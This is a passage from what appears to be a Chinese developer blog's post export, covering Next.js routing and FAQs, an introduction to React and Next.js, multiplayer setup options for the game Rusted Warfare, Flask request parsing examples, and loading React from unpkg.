<h2 id="Dynamic-Routes-1"><a href="#Dynamic-Routes-1" class="headerlink" title="Dynamic Routes"></a>Dynamic Routes</h2><h3 id="Folder-convention-1"><a href="#Folder-convention-1" class="headerlink" title="Folder convention"></a>Folder convention</h3><p><code>[folder]/index</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	动态路由段</p>
<p><code>[...folder]/index</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	捕获所有路由段</p>
<p><code>[[...folder]]/index</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code>	可选的捕获全部路由段</p>
<h3 id="File-convention-1"><a href="#File-convention-1" class="headerlink" title="File convention"></a>File convention</h3><p>| <a href="https://nextjs.org/docs/pages/building-your-application/routing/dynamic-routes"><code>[file]</code></a> | <code>.js</code> <code>.jsx</code> <code>.tsx</code> | Dynamic route segment            |
| ———————————————————— | ——————- | ——————————– |
| <a href="https://nextjs.org/docs/pages/building-your-application/routing/dynamic-routes#catch-all-segments"><code>[...file]</code></a> | <code>.js</code> <code>.jsx</code> <code>.tsx</code> | Catch-all route segment          |
| <a href="https://nextjs.org/docs/pages/building-your-application/routing/dynamic-routes#optional-catch-all-segments"><code>[[...file]]</code></a> | <code>.js</code> <code>.jsx</code> <code>.tsx</code> | Optional catch-all route segment |</p>
<h2 id="App-Router"><a href="#App-Router" class="headerlink" title="App Router"></a>App Router</h2><p><code>Next.js</code> 应用程序路由器为React的最新范例功能，应用路由是由基于文件系统的路由器在页面路由器中的自然演变。</p>
<p>一个应用程序中可以采取两种路由方式，但官方仍然建议使用应用路由器。</p>
<h2 id="Frequently-Asked-Questions"><a href="#Frequently-Asked-Questions" class="headerlink" title="Frequently Asked Questions"></a>Frequently Asked Questions</h2><h3 id="How-can-I-access-the-request-object-in-a-layout"><a href="#How-can-I-access-the-request-object-in-a-layout" class="headerlink" title="How can I access the request object in a layout?"></a>How can I access the request object in a layout?</h3><p>如何访问布局中的请求对象？</p>
<p>没有办法直接访问原始的请求对象，但是可以通过服务端函数访问请求头和Cookie，也可以设置Cookie。</p>
<p>布局不会重新渲染，可以缓存和复用，以减少页面之间进行导航的非必要计算。通过限制布局访问原始请求，<code>Next.js</code> 可以访问在布局中执行潜在的缓慢或昂贵的用户代码，这可能对性能造成负面影响。</p>
<h2 id="Build-Your-Application"><a href="#Build-Your-Application" class="headerlink" title="Build Your Application"></a>Build Your Application</h2><p>这种设计还强制不同页面之间的布局一致且可预测，以此来简化开发和调试，因为开发人员可以依靠布局以相同方式表现，而无需考虑所应用的特定页面。</p>
<p>根据正在构建的UI模式，Parallel 路由允许同一布局中呈现多个页面，并且页面可以访问路由段以</p>
<h2 id="How-can-I-access-the-URL-on-a-page"><a href="#How-can-I-access-the-URL-on-a-page" class="headerlink" title="How can I access the URL on a page?"></a>How can I access the URL on a page?</h2><p>如何访问页面上的URL？</p>
<p>默认情况下，页面是服务器组件。对于给定的页面可以通过 <code>params</code> 属性访问路由段，通过 <code>searchParams</code> 访问URL搜索参数。</p>
<p>如果使用的是客户端组件，对于更复杂的路由，可以使用 <code>usePathname</code>、<code>useSelectedLayout</code> 和<code>useSelectedLayoutSegments</code>。</p>
<p>此外，根据正在构建的UI模式 Parallel 路由允许在相同的布局呈现多个页面，并且页面可以访问路由段以及URL搜索参数。</p>
<h2 id="How-can-I-redirect-form-a-Server-Component"><a href="#How-can-I-redirect-form-a-Server-Component" class="headerlink" title="How can I redirect form a Server Component?"></a>How can I redirect form a Server Component?</h2><p>如何重定向服务器组件？</p>
<p>可以使用<code>redirect</code>将页面重定向到相对或绝对URL。<code>redirect</code>是临时（307）重定向，而<code>permanentRedirect</code>是永久（308）重定向。在流式UI中使用这些功能时，将会插入一个<code>meta</code>标签以客户端发出重定向。</p>
<h1 id="How-can-I-handle-authentication-with-the-App-Router"><a href="#How-can-I-handle-authentication-with-the-App-Router" class="headerlink" title="How can I handle authentication with the App Router."></a>How can I handle authentication with the App Router.</h1><p>如何使用 App 路由进行身份验证？</p>
<p>官方给出的方案：</p>
<pre><code>- [NextAuth.js](https://next-auth.js.org/configuration/nextjs#in-app-router)
- [Clerk](https://clerk.com/docs/quickstarts/nextjs)
- [Auth0](https://github.com/auth0/nextjs-auth0#app-router)
- Or manually handling sessions or JWTs
</code></pre>
<h2 id="How-can-I-set-cookies"><a href="#How-can-I-set-cookies" class="headerlink" title="How can I set cookies?"></a>How can I set cookies?</h2><p>可以使用 <code>cookies </code> 函数在<code>Server Actions</code> 或 <code>rOUTE hANDLERS</code> 中设置cookies。</p>
<p>由于 HTTP 不允许在流开始后设置 cookies ,因此不能从页面或者布局中之间设置 cookies。其他方法是从<code>Middleware</code>也就是中间件中设置。</p>
<h2 id="How-can-I-build-multi-tenant-apps"><a href="#How-can-I-build-multi-tenant-apps" class="headerlink" title="How can I build multi-tenant apps?"></a>How can I build multi-tenant apps?</h2><p>我该如何构建多用户应用程序？</p>
<p>例子 https:&#x2F;&#x2F;vercel.com&#x2F;templates&#x2F;next.js&#x2F;platforms-starter-kit</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>了解Next.js</title>
    <url>/2023/09/25/2023-9-25-%E4%BA%86%E8%A7%A3Next-js/</url>
    <content><![CDATA[<h3 id="Next-js"><a href="#Next-js" class="headerlink" title="Next.js"></a>Next.js</h3><p>Next.js 是什么？</p>
<ul>
<li>官方：Next.js is a flexible React framework that gives you building blocks to create fast web applications.<ul>
<li>翻译：Next.js 是一个灵活的React框架，它为我们提供快速构建web应用程序的构建块。</li>
</ul>
</li>
</ul>
<h3 id="Building-Blocks-of-a-Web-Application"><a href="#Building-Blocks-of-a-Web-Application" class="headerlink" title="Building Blocks of a Web Application"></a>Building Blocks of a Web Application</h3><p>— 改编自 Next.js 官网</p>
<p>也就是web应用构建块。这仍然是个比较抽象的概念，我们需要知道，什么是web应用构建块。</p>
<p>构建web应用程序时，我们需要考虑以下几点：</p>
<pre><code>- 用户界面：提供应用程序，使用户与之交互。
- 路由：用户在应用程序不同部分之间导航。
- 数据获取：数据位于何处以及如何获取。
- 渲染：何时何地渲染静态或动态内容。
- 集成：使用的第三方服务（CMS、身份验证、支付等）以及如何连接它们。
- 基础架构：部署、存储和运行应用程序代码（Serverless、CDN、Edge等）的地方。
- 性能：如何为最终用户优化应用程序。
- 可扩展性：应用程序如何随着团队、数据和流量的增长而进行调整。
- 开发经验：团队构建和维护应用程序的经验。
</code></pre>
<p> 对于应用程序的每个部分，需要决定是自己构建解决方案，还是使用库和框架等其他工具。 </p>
<p>综上所述，用户界面、路由、数据获取、渲染…等，这些点，其实都算是一个个的构建块。而以上所有内容，我们都可以使用Next.js 实现。至于这些到底是什么，我们将一一细究。</p>
<p><strong>那么</strong></p>
<h3 id="React-是啥？"><a href="#React-是啥？" class="headerlink" title="React 是啥？"></a>React 是啥？</h3><p>官方说了： <a href="https://react.dev/learn">React</a> is a JavaScript <strong>library</strong> for building interactive <strong>user interfaces</strong>. </p>
<p>翻译： React是一个用于构建交互式用户界面的JavaScript库。 </p>
<ul>
<li><p>什么是用户界面：使用代码呈现给用户看的界面，就是用户界面。而一般用户界面有两种：CLI 和 GUI（命令行界面和图形化界面），而我们浏览器为我们提供的 WEB 界面，正是一种GUI界面。</p>
</li>
<li><p>Next.js 官方的解释是这样的：By user interfaces, we mean the elements that users see and interact with on-screen.</p>
<ul>
<li>翻译：所谓用户界面，我们指的是用户在屏幕上看到并与之交互的元素。</li>
</ul>
</li>
</ul>
<p>什么是库？</p>
<ul>
<li>官方：By library, we mean React provides helpful functions to build UI, but leaves it up to the developer where to use those functions in their  application.<ul>
<li>所谓库，我们的意思是React提供了有用的函数来构建UI，但将这些函数在应用程序中的使用交予开发人员。</li>
</ul>
</li>
</ul>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/user-interface.png" class="">

<p>有了库，我们可以直接引用已经开发好的函数来构建应用程序，这可以大幅度加快我们的开发效率。我们不必在开发时深究底层，什么功能都要自己从零开始写，也就是俗称的”造轮子“。引用前人的智慧，这亦是一种智慧。</p>
<p>官方原文：</p>
<ul>
<li>Part of React’s success is that it is relatively unopinionated about the other aspects of building applications. This has resulted in a flourishing ecosystem of third-party tools and solutions.<ul>
<li>React的成功部分在于，它对构建应用程序的其他方面相对不持偏见。这使得第三方工具和解决方案的生态系统蓬勃发展。</li>
</ul>
</li>
<li>It also means, however, that building a complete React application from the ground up requires some effort. Developers need to spend time configuring tools and reinventing solutions for common application requirements.<ul>
<li>然而，这也意味着，从头开始构建一个完整的React应用程序需要付出一些努力。开发人员需要花费时间配置工具，并根据常见的应用程序需求重新设计解决方案。</li>
</ul>
</li>
</ul>
<p>也就是说，这门技术海纳百川，非常强大，几乎啥都能干。这也意味着，想要开发一个React应用程序，就需要明白一个应用程序项目的各个关节，因为它非常的全面，而且是较为独立的一个技术栈，所以需要投入较多的精力去学习。</p>
<p>话说回来</p>
<h3 id="什么是Next-js-？"><a href="#什么是Next-js-？" class="headerlink" title="什么是Next.js ？"></a>什么是Next.js ？</h3><p>官方：Next.js is a React framework that gives you building blocks to create web applications.</p>
<ul>
<li>翻译： Next.js是一个React框架，它为您提供创建web应用程序的构建块。</li>
</ul>
<p>官方：By framework, we mean Next.js handles the tooling and configuration needed for React, and provides additional structure, features, and optimizations for your application.</p>
<ul>
<li>翻译： 所谓框架，我们的意思是Next.js处理React所需的工具和配置，并为您的应用程序提供额外的结构、功能和优化。</li>
</ul>
<p>官方：You can use React to build your UI, then incrementally adopt Next.js features to solve common application requirements such as routing, data fetching, integrations - all while improving the developer and end-user experience.</p>
<ul>
<li>翻译：您可以使用React构建UI，然后逐步采用Next.js功能来解决常见的应用程序需求，如路由、数据获取、集成，同时改善开发人员和最终用户体验。</li>
</ul>
<p>官方：Whether you’re an individual developer or part of a larger team, you can leverage React and Next.js to build fully interactive, highly dynamic, and performant web applications.</p>
<ul>
<li>翻译：无论您是个人开发人员还是更大团队的一员，都可以利用React和Next.js构建完全交互式、高度动态和高性能的web应用程序。</li>
</ul>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/next-app.png" class="">

<p>React是一个强大的js库，而Next.js 是一个React的框架，它为React而生！这就是Next.js，既然已经知道吾之真名了，那就！步入正题！向着开发，前进！</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
      </tags>
  </entry>
  <entry>
    <title>联机教程</title>
    <url>/2023/09/05/2023-9-5-%E8%81%94%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="【联机方式】"><a href="#【联机方式】" class="headerlink" title="【联机方式】"></a>【联机方式】</h3><p>铁锈战争非常的自由，支持多种联机方式。
下面按照使用难度从易到难，分别叙述。</p>
<h4 id="【公开服务器联机】难度-零星"><a href="#【公开服务器联机】难度-零星" class="headerlink" title="【公开服务器联机】难度: 零星"></a>【公开服务器联机】难度: 零星</h4><p>出现在多人游戏列表中的官方服务器以及第三方服务器，只需点击即可加入。</p>
<h4 id="【REPALY联机】难度-一星"><a href="#【REPALY联机】难度-一星" class="headerlink" title="【REPALY联机】难度: 一星"></a>【REPALY联机】难度: 一星</h4><p>RELAY, 又称继电器, 是在 Rusted Warfare 1.14.P8 (测试版) 加入的功能, 目的是在 不使用 任何工具的情况下, 使玩家作为 NAT 网络下的工具, 可以和玩家进行联机.
                                                                —- Dr</p>
<h5 id="官方REPALY"><a href="#官方REPALY" class="headerlink" title="[官方REPALY]:"></a>[官方REPALY]:</h5><p>多人游戏列表中选择Aisa&#x2F;US
Aisa为亚洲REPALY,US为美洲REPLAY</p>
<h5 id="第三方REPLAY"><a href="#第三方REPLAY" class="headerlink" title="[第三方REPLAY]:"></a>[第三方REPLAY]:</h5><p>RELAY-CN 是由 RW-HPS &amp; RCN Team 搭建的 中国区非官方 RELAY (ID: R) rcn[docs]: https:&#x2F;&#x2F;docs.der.kim&#x2F;web&#x2F;#&#x2F;5&#x2F;23
RELAY-RU 是由 Vulkan (RMT) 搭建的 俄区非官方 RELAY (ID: V) : </p>
<h4 id="【第三方联机服务】难度-一星"><a href="#【第三方联机服务】难度-一星" class="headerlink" title="【第三方联机服务】难度: 一星"></a>【第三方联机服务】难度: 一星</h4><p>蒲公英联机、水瓶联机、小火箭联机，等。
通过第三方联机平台进行的联机，具体情况视软件而不同，故不多赘述。</p>
<h4 id="【ipv6联机】难度-二星"><a href="#【ipv6联机】难度-二星" class="headerlink" title="【ipv6联机】难度: 二星"></a>【ipv6联机】难度: 二星</h4><p>ipv6对某些未普及的地区来说属于比较苛刻的条件，但随时间推移这也许将不再苛刻。
铁锈战争支持ipv6直连，如果你和你的朋友都支持ipv6话可以考虑。
一个IPV6检测网站: http:&#x2F;&#x2F;test-ipv6.com&#x2F;
如果检测不到ipv6可以尝试开启，开启后输入ipv6地址+5123端口直连即可。</p>
<h4 id="【自建第三方服务器联机】难度-三星"><a href="#【自建第三方服务器联机】难度-三星" class="headerlink" title="【自建第三方服务器联机】难度: 三星"></a>【自建第三方服务器联机】难度: 三星</h4><p>这需要你成为铁锈战争的服主，首先你需要有一台拥有公网的服务器，然后在你的服务器上运行联机服务软件即可。
一些开源的联机服务软件：
        - [RW-HPS]:https:&#x2F;&#x2F;github.com&#x2F;RW-HPS&#x2F;RW-HPS&#x2F;
        - [Rukkit]:https:&#x2F;&#x2F;github.com&#x2F;RukkitDev&#x2F;Rukkit
        - [RW-CPPS]:https:&#x2F;&#x2F;github.com&#x2F;shishanyue&#x2F;RW-CPPS</p>
<p>####【端口映射和端口转发】难度: 三星</p>
<h5 id="端口映射-将外网的一个端口完全映射给内网一个地址的指定端口-实现外网到内网和内网到外网双向的通信"><a href="#端口映射-将外网的一个端口完全映射给内网一个地址的指定端口-实现外网到内网和内网到外网双向的通信" class="headerlink" title="[端口映射]:将外网的一个端口完全映射给内网一个地址的指定端口,实现外网到内网和内网到外网双向的通信."></a>[端口映射]:将外网的一个端口完全映射给内网一个地址的指定端口,实现外网到内网和内网到外网双向的通信.</h5><pre><code>- 知乎：https://zhuanlan.zhihu.com/p/43233032
</code></pre>
<h5 id="端口转发-如果你有一台可以使用公网的设备-而你又无法直接在那个设备上进行游戏，可以借助工具进行端口转发，从而利用公网为你的游戏联机提供服务。这里仅推荐开源的跨平台端口转发工具–FRP。"><a href="#端口转发-如果你有一台可以使用公网的设备-而你又无法直接在那个设备上进行游戏，可以借助工具进行端口转发，从而利用公网为你的游戏联机提供服务。这里仅推荐开源的跨平台端口转发工具–FRP。" class="headerlink" title="[端口转发]:如果你有一台可以使用公网的设备,而你又无法直接在那个设备上进行游戏，可以借助工具进行端口转发，从而利用公网为你的游戏联机提供服务。这里仅推荐开源的跨平台端口转发工具–FRP。"></a>[端口转发]:如果你有一台可以使用公网的设备,而你又无法直接在那个设备上进行游戏，可以借助工具进行端口转发，从而利用公网为你的游戏联机提供服务。这里仅推荐开源的跨平台端口转发工具–FRP。</h5><pre><code>- FRP端口转发: https://gofrp.org/
</code></pre>
<h3 id="【自己写个联机软件】难度-满天星"><a href="#【自己写个联机软件】难度-满天星" class="headerlink" title="【自己写个联机软件】难度: 满天星"></a>【自己写个联机软件】难度: 满天星</h3><p>自己想。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[探索]</title>
    <url>/2023/07/04/2023-7-4-Flask-3/</url>
    <content><![CDATA[<h1 id="请求对象request"><a href="#请求对象request" class="headerlink" title="请求对象request"></a>请求对象request</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>request是flask框架的全局对象，可以通过它来获得当前进入的请求数据。</p>
<p>而在多线程环境下，flask可以保证所使用的request对象为当前这个线程所处理的请求。</p>
<blockquote><p>关于request，最让人感到疑惑的地方在于，明明是一个全局变量，在使用时却提供了当前时刻的请求数据，而且，不同线程之间互不干扰，它是如何设计出来的呢。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<p>通过request可以获得当前请求的全部信息，例如请求的method,path, url, headers,cookies,请求的参数，请求的body…..</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>服务端代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="built_in">print</span>(request.method)       <span class="comment"># 请求方法</span></span><br><span class="line">    <span class="built_in">print</span>(request.headers)      <span class="comment"># 请求的headers</span></span><br><span class="line">    <span class="built_in">print</span>(request.path)         <span class="comment"># 资源路径</span></span><br><span class="line">    <span class="built_in">print</span>(request.url)          <span class="comment"># 完整的url</span></span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)  <span class="comment"># 客户端IP</span></span><br><span class="line">    <span class="built_in">print</span>(request.cookies)      <span class="comment"># 请求的cookie</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie_dict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;python&#x27;</span>&#125;</span><br><span class="line">res = requests.get(<span class="string">&#x27;http://127.0.0.1:5000/users&#x27;</span>, cookies=cookie_dict)</span><br></pre></td></tr></table></figure>

<p>使用客户端代码发出请求后，服务端程序会输出如下内容</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET              # 请求方法</span><br><span class="line">Content-Type: </span><br><span class="line">Content-Length: </span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: name=python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/users          # 资源路径</span><br><span class="line">http://127.0.0.1:5000/users     # 完整路径</span><br><span class="line">127.0.0.1                       # 客户端ip</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;python&#x27;&#125;              # 请求的cookie</span><br></pre></td></tr></table></figure>

<blockquote><p>提醒一点，request.remote_addr并不一定能够准确的获得客户端的IP，因为在部署服务时，通常最前端用nginx做转发，这样，你获得其实是nginx的IP地址，而非用户的真实地址，如何准确获得客户端的IP地址，请参考文章https:&#x2F;&#x2F;www.cnblogs.com&#x2F;mzhaox&#x2F;p&#x2F;11214747.html</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h1 id="解析请求数据"><a href="#解析请求数据" class="headerlink" title="解析请求数据"></a>解析请求数据</h1><p>客户端（浏览器）会向服务器提交HTTP请求；然后服务器向客户端返回响应；其中响应包含有关请求的状态信息，还可能包含请求的内容。</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>get请求用于查询数据时，通常会带有参数，参数放在path的后面，中间用问号连接。</p>
<p>多个请求参数以key&#x3D;value的形式用&amp;连接起来。</p>
<p>下面是一个带参数的get请求的示例url：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/users?name=poly&amp;age=14</span><br></pre></td></tr></table></figure>

<p>get请求的参数可以通过request.args 和 request.values 两种方法来获得</p>
<p>其中request.args 是包含解析过的get参数的MultiDict</p>
<blockquote><p>MultiDict 是werkzeug提供的一种多key字典，具体可参考 https:&#x2F;&#x2F;werkzeug.palletsprojects.com&#x2F;en&#x2F;0.16.x&#x2F;datastructures&#x2F;#werkzeug.datastructures.MultiDict </p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<p>使用方法示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    age = request.args[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(name, age)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"><span class="comment"># 获取到的参数一律都是字符串类型</span></span><br></pre></td></tr></table></figure>

<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>post请求用于新增数据，它提交数据的格式有两种：form表单，json数据</p>
<p>requests.form里存储着post请求提交的form表单数据，下面是解析示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    age = request.form[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(name, age)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="request-values"><a href="#request-values" class="headerlink" title="request.values"></a>request.values</h3><p>request.args和request.form，其类型都是MultiDict。</p>
<p>因此，flask又提供了一个request.values，类型为CombinedMultiDict。</p>
<p>它包含了args和form,这样，在获取数据时，就不必在纠结到底用args还是用form了，request.values使用方法与args,form相同。</p>
<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>post提交的json数据，应该用get_json()方法来获取</p>
<p>服务端示例代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure>

<p>客户端示例代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://127.0.0.1:5000/users&#x27;</span>, json=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;poly&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">13</span>&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Next学习手册（二）- React</title>
    <url>/2023/09/25/2023-9-25-Next%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C%EF%BC%88%E4%BA%8C%EF%BC%89-%20React/</url>
    <content><![CDATA[<h3 id="使用unpkg"><a href="#使用unpkg" class="headerlink" title="使用unpkg"></a>使用unpkg</h3><p>当我们使用React进行开发时，首要做的应该是先引用这个库。就像Python开发要先pip导入包一样，这个同理。</p>
<p>我们想在项目中引用React这个库时，无外乎有两种方式，一种是直接下载下React库的文件来，部署在本地，然后引用本地文件。另一种就是通过<code>&lt;script src=url...</code>的方式，从网络中的资源进行引用。</p>
<p>而在网络中引用的方式很多，其中unpkg就是其中一种。</p>
<h4 id="什么是unpkg"><a href="#什么是unpkg" class="headerlink" title="什么是unpkg?"></a>什么是unpkg?</h4><p>官方：unpkg is a fast, global content delivery network for everything on <a href="https://www.npmjs.com/">npm</a>. Use it to quickly and easily load any file from any package using a URL like:</p>
<ul>
<li>翻译：unpkg是一个快速的全球内容交付网络，适用于npm上的所有内容。使用它可以使用以下URL快速轻松地从任何包加载任何文件</li>
</ul>
<p>格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">unpkg.com/:package@:version/:file</span><br></pre></td></tr></table></figure>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>我们将使用unpkg导入 react 和 react-dom 两个库</p>
<ul>
<li><strong>react</strong> ：React的核心库。</li>
<li><strong>react-dom</strong> ：提供了特定于dom的方法，以此能够将react与dom一起使用。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	&lt;! -- 使用unpkg --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@17/umd/react.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react-dom@17/umd/react-dom.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接使用react-DOM中的<code>ReactDOM.render</code>()方法来告诉react在<code>id=app</code>元素中呈现<code>&lt;h1&gt;</code>，而不必使用纯JavaScript操作DOM。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@17/umd/react.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react-dom@17/umd/react-dom.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>, app);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>按理说这么写没错对吧？</p>
<p>运行一下，好，一片空白！</p>
<p>按下 F12 我们看到一个孤零零的报错。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/error.png" class="">

<p>这是一个语法错误，原因很简单，官方的解释一目了然。</p>
<ul>
<li>This is because <code>&lt;h1&gt;...&lt;/h1&gt;</code> is not valid Javascript. This piece of code is JSX.<ul>
<li>翻译： 这是因为 <code>&lt;h1&gt;...&lt;/h1&gt;</code>不是有效的Javascript。这段代码是JSX。</li>
</ul>
</li>
</ul>
